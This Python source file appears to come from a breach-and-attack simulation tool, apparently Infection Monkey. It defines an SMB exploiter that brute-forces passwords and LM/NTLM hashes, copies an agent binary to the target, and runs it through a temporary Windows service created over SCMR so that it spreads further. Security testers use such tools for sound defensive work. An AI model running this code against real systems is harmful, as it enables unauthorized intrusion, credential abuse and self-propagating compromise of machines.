from dataclasses import dataclass
from logging import getLogger
from pathlib import PurePath
from typing import Optional, Tuple

from impacket.dcerpc.v5 import scmr, transport
from impacket.dcerpc.v5.scmr import DCERPCSessionError

from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
from common.credentials import get_plaintext
from common.utils.attack_utils import ScanStatus, UsageEnum
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.smb_tools import SmbTools
from infection_monkey.model import DROPPER_CMDLINE_DETACHED_WINDOWS, MONKEY_CMDLINE_DETACHED_WINDOWS
from infection_monkey.telemetry.attack.t1035_telem import T1035Telem
from infection_monkey.utils.brute_force import (
    generate_brute_force_combinations,
    get_credential_string,
)
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.threading import interruptible_iter

logger = getLogger(__name__)


@dataclass
class SelectedCredentials:
    user: str
    password: str
    lm_hash: str
    ntlm_hash: str


class SMBExploiter(HostExploiter):
    _EXPLOITED_SERVICE = "SMB"
    KNOWN_PROTOCOLS = {
        "139/SMB": (r"ncacn_np:%s[\pipe\svcctl]", 139),
        "445/SMB": (r"ncacn_np:%s[\pipe\svcctl]", 445),
    }
    USE_KERBEROS = False
    SMB_SERVICE_NAME = "InfectionMonkey"

    def _exploit_host(self):

        dest_path = get_agent_dst_path(self.host)
        remote_full_path, creds = self._exploit(dest_path)

        if not self.exploit_result.exploitation_success:
            if self._is_interrupted():
                self._set_interrupted()
            else:
                logger.debug("Exploiter SmbExec is giving up...")
                self.exploit_result.error_message = "Failed to authenticate to the victim over SMB"

            return self.exploit_result

        # execute the remote dropper in case the path isn't final
        if remote_full_path.lower() != str(dest_path).lower():
            cmdline = DROPPER_CMDLINE_DETACHED_WINDOWS % {
                "dropper_path": remote_full_path
            } + build_monkey_commandline(
                self.servers,
                self.current_depth + 1,
                str(dest_path),
            )
        else:
            cmdline = MONKEY_CMDLINE_DETACHED_WINDOWS % {
                "monkey_path": remote_full_path
            } + build_monkey_commandline(self.servers, self.current_depth + 1)

        smb_conn = None
        for str_bind_format, port in SMBExploiter.KNOWN_PROTOCOLS.values():
            rpctransport = transport.DCERPCTransportFactory(str_bind_format % (self.host.ip_addr,))
            rpctransport.set_connect_timeout(LONG_REQUEST_TIMEOUT)
            rpctransport.set_dport(port)
            rpctransport.setRemoteHost(self.host.ip_addr)
            if hasattr(rpctransport, "set_credentials"):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(
                    creds.user,
                    get_plaintext(creds.password),
                    "",
                    get_plaintext(creds.lm_hash),
                    get_plaintext(creds.ntlm_hash),
                    None,
                )
            rpctransport.set_kerberos(SMBExploiter.USE_KERBEROS)

            scmr_rpc = rpctransport.get_dce_rpc()

            try:
                scmr_rpc.connect()
            except Exception as exc:
                logger.debug(
                    f"Can't connect to SCM on exploited machine {self.host}, port {port} : "
                    f"{exc}"
                )
                continue

            logger.debug(f"Connected to SCM on exploited machine {self.host}, port {port}")
            smb_conn = rpctransport.get_smb_connection()
            smb_conn.setTimeout(LONG_REQUEST_TIMEOUT)
            break

        if not smb_conn:
            msg = "Failed to establish an RPC connection over SMB"

            logger.warning(msg)
            self.exploit_result.error_message = msg

            return self.exploit_result

        scmr_rpc.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(scmr_rpc)
        sc_handle = resp["lpScHandle"]

        # start the monkey using the SCM
        try:
            resp = scmr.hRCreateServiceW(
                scmr_rpc,
                sc_handle,
                SMBExploiter.SMB_SERVICE_NAME,
                SMBExploiter.SMB_SERVICE_NAME,
                lpBinaryPathName=cmdline,
            )
        except DCERPCSessionError as err:
            if err.error_code == 0x431:
                logger.debug(f'SMB service "{SMBExploiter.SMB_SERVICE_NAME}" already exists')
                resp = scmr.hROpenServiceW(scmr_rpc, sc_handle, SMBExploiter.SMB_SERVICE_NAME)
            else:
                self.exploit_result.error_message = str(err)
                return self.exploit_result

        service = resp["lpServiceHandle"]
        try:
            scmr.hRStartServiceW(scmr_rpc, service)
            status = ScanStatus.USED
        except Exception:
            status = ScanStatus.SCANNED
            pass
        self.telemetry_messenger.send_telemetry(T1035Telem(status, UsageEnum.SMB))
        scmr.hRDeleteService(scmr_rpc, service)
        scmr.hRCloseServiceHandle(scmr_rpc, service)

        logger.info(
            "Executed monkey '%s' on remote victim %r (cmdline=%r)",
            remote_full_path,
            self.host,
            cmdline,
        )
        self.exploit_result.propagation_success = True

        self.add_vuln_port(
            "%s or %s"
            % (
                SMBExploiter.KNOWN_PROTOCOLS["139/SMB"][1],
                SMBExploiter.KNOWN_PROTOCOLS["445/SMB"][1],
            )
        )
        return self.exploit_result

    def _exploit(self, dest_path: PurePath) -> Tuple[Optional[str], SelectedCredentials]:
        agent_binary = self.agent_binary_repository.get_agent_binary(self.host.os["type"])
        creds = generate_brute_force_combinations(self.options["credentials"])
        for user, password, lm_hash, ntlm_hash in interruptible_iter(creds, self.interrupt):
            creds_for_log = get_credential_string([user, password, lm_hash, ntlm_hash])

            try:
                # copy the file remotely using SMB
                remote_full_path = SmbTools.copy_file(
                    self.host,
                    agent_binary,
                    dest_path,
                    user,
                    password,
                    lm_hash,
                    ntlm_hash,
                    self.options["smb_download_timeout"],
                )

                if remote_full_path is not None:
                    logger.info(
                        f"Successfully logged in to {self.host.ip_addr} using SMB "
                        f"with {creds_for_log}"
                    )
                    self.report_login_attempt(True, user, password, lm_hash, ntlm_hash)
                    self.add_vuln_port(
                        "%s or %s"
                        % (
                            SMBExploiter.KNOWN_PROTOCOLS["139/SMB"][1],
                            SMBExploiter.KNOWN_PROTOCOLS["445/SMB"][1],
                        )
                    )
                    self.exploit_result.exploitation_success = True
                    break
                else:
                    # failed exploiting with this user/pass
                    self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)

            except Exception as exc:
                logger.error(
                    f"Error while trying to copy file using SMB to {self.host.ip_addr} with "
                    f"{creds_for_log}:{exc}"
                )
                continue

        return remote_full_path, SelectedCredentials(user, password, lm_hash, ntlm_hash)
